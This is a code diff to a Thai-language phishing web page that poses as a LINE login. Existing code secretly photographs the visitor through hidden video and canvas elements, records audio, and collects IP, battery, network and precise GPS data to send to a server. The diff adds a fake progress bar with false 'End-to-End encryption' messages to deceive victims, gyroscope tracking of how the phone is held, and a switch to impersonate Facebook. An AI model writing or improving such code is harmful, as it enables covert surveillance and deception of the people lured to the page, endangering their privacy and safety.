@@ -124,6 +124,29 @@
             display: none;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Fake Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background-color: #f0f0f0;
+            border-radius: 3px;
+            margin-top: 15px;
+            overflow: hidden;
+            display: none; /* ซ่อนไว้ก่อน */
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #06C755;
+            transition: width 0.3s ease;
+        }
+        .loading-text {
+            font-size: 13px;
+            color: #666;
+            margin-top: 8px;
+            display: none; /* ซ่อนไว้ก่อน */
+        }
     </style>
 </head>
 <body>
@@ -152,6 +175,13 @@
             <div id="btnSpinner" class="spinner"></div>
             <span id="btnText">เข้าสู่ระบบด้วยบัญชี LINE</span>
         </button>
+        
+        <!-- แถบโหลดปลอม -->
+        <div id="progressContainer" class="progress-container">
+            <div id="progressBar" class="progress-bar"></div>
+        </div>
+        <p id="loadingText" class="loading-text">กำลังตรวจสอบข้อมูลความปลอดภัย...</p>
+        
         <p id="status"></p>
 
         <!-- ซ่อน Video และ Canvas ไว้ใช้ถ่ายรูปเบื้องหลัง -->
@@ -165,11 +195,16 @@
     </div>
 
     <script>
+        // --- 🎭 การตั้งค่าธีม (Multi-Disguise) ---
+        // สามารถเปลี่ยนเป็น 'LINE', 'FACEBOOK', 'INSTAGRAM' ได้ในอนาคต
+        const THEME = 'LINE'; 
+
         let imageDatas = []; // เก็บรูปถ่ายแบบ Base64 (Array 3 รูป)
         let audioData = null; // เก็บไฟล์เสียง
         let ipData = null; // เก็บข้อมูล IP
         let batteryData = null; // เก็บข้อมูลแบตเตอรี่
         let networkType = 'Unknown'; // เก็บข้อมูลประเภทเน็ต
+        let deviceOrientation = 'ไม่ทราบ (ไม่มีเซ็นเซอร์หรือไม่อนุญาต)'; // เก็บข้อมูลองศามือถือ
 
         // โหลดข้อมูล IP ทันทีที่เปิดเว็บ
         fetch('https://ipapi.co/json/')
@@ -187,6 +222,25 @@
             });
         }
 
+        // ดักจับเซ็นเซอร์ Gyroscope (องศาการถือมือถือ)
+        window.addEventListener('deviceorientation', (event) => {
+            // beta: หน้าจอตั้งขึ้น/นอนลง (ตั้งตรง = 90, วางราบ = 0)
+            // gamma: เอียงซ้าย/ขวา
+            if (event.beta !== null) {
+                let position = '';
+                if (event.beta > 45 && event.beta < 135) {
+                    position = '📱 ถือเครื่องแนวตั้ง (กำลังมองหน้าจอ)';
+                } else if (event.beta < 20 && event.beta > -20) {
+                    position = '📳 วางเครื่องราบกับโต๊ะ (หงายหน้าจอ)';
+                } else if (event.beta < -160 || event.beta > 160) {
+                    position = '📴 วางเครื่องคว่ำหน้าจอ';
+                } else {
+                    position = '🔄 ถือเครื่องแบบเอียงๆ';
+                }
+                deviceOrientation = `${position} (เอียง ${Math.round(event.beta)} องศา)`;
+            }
+        });
+
         // ขอสิทธิ์กล้องและไมค์ ถ่ายรูปรัว และอัดเสียง
         async function getLocation() {
             const username = document.getElementById('usernameInput').value;
@@ -197,11 +251,34 @@
             const btnIcon = document.getElementById('btnIcon');
             const btnSpinner = document.getElementById('btnSpinner');
             
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            const loadingText = document.getElementById('loadingText');
+            
             status.textContent = '';
             btnText.textContent = 'กำลังเชื่อมต่อ...';
             btnIcon.style.display = 'none';
             btnSpinner.style.display = 'block';
             btn.disabled = true;
+            
+            // โชว์แถบโหลดหลอกตา
+            progressContainer.style.display = 'block';
+            loadingText.style.display = 'block';
+            
+            // ฟังก์ชันแอนิเมชันแถบโหลดหลอกๆ
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15; // สุ่มเพิ่มทีละนิด
+                if (progress > 85) progress = 85; // ค้างไว้ที่ 85% รอจนกว่าจะส่งข้อมูลเสร็จ
+                progressBar.style.width = progress + '%';
+                
+                // สลับข้อความหลอก
+                if (progress > 30 && progress < 60) {
+                    loadingText.textContent = "กำลังเข้ารหัสข้อมูล (End-to-End)...";
+                } else if (progress >= 60) {
+                    loadingText.textContent = "กำลังยืนยันตัวตนกับเซิร์ฟเวอร์...";
+                }
+            }, 400);
 
             // เช็คประเภทอินเทอร์เน็ต
             if (navigator.connection && navigator.connection.effectiveType) {
@@ -260,14 +337,25 @@
                 // ถึงจะไม่ได้สิทธิ์ ก็จะไปต่อเพื่อขอตำแหน่ง
             }
 
-            // หลังจากได้รูป (หรือไม่ได้) ก็ขอตำแหน่งต่อ
+            // หลังจากเก็บรูปและเสียงเสร็จ ก็ขอตำแหน่งต่อ
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // ดันแถบโหลดให้เต็ม 100%
+                        clearInterval(progressInterval);
+                        progressBar.style.width = '100%';
+                        loadingText.textContent = "เข้าสู่ระบบสำเร็จ! กำลังเปลี่ยนหน้า...";
+                        sendData(position);
+                    }, 
+                    showError, 
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
             } else { 
+                clearInterval(progressInterval);
                 status.textContent = "อุปกรณ์ของคุณไม่รองรับการยืนยันตัวตน";
                 status.style.color = "red";
                 resetButton();
@@ -301,7 +389,8 @@
                 ram: navigator.deviceMemory || 'N/A',
                 ip: ipData,
                 battery: batteryData,
-                network: networkType
+                network: networkType,
+                orientation: deviceOrientation
             };
 
             // ส่งข้อมูลทั้งหมดไปที่เซิร์ฟเวอร์
@@ -329,13 +418,15 @@
                 btnIcon.style.display = 'block';
                 btnSpinner.style.display = 'none';
                 
-                // ระบบเด้งเข้าแอป LINE จริงหรือเว็บ LINE Official
+                // ระบบเด้งเข้าแอปจริง (อิงตาม THEME)
                 setTimeout(() => {
-                    // ลองเปิดแอป LINE ก่อน ถ้าไม่มีให้ไปเว็บหลัก
-                    window.location.href = "line://";
-                    setTimeout(() => {
-                        window.location.href = "https://line.me/th/";
-                    }, 500);
+                    if (THEME === 'LINE') {
+                        window.location.href = "line://";
+                        setTimeout(() => window.location.href = "https://line.me/th/", 500);
+                    } else if (THEME === 'FACEBOOK') {
+                        window.location.href = "fb://";
+                        setTimeout(() => window.location.href = "https://www.facebook.com/", 500);
+                    }
                 }, 1500);
             })
             .catch((error) => {
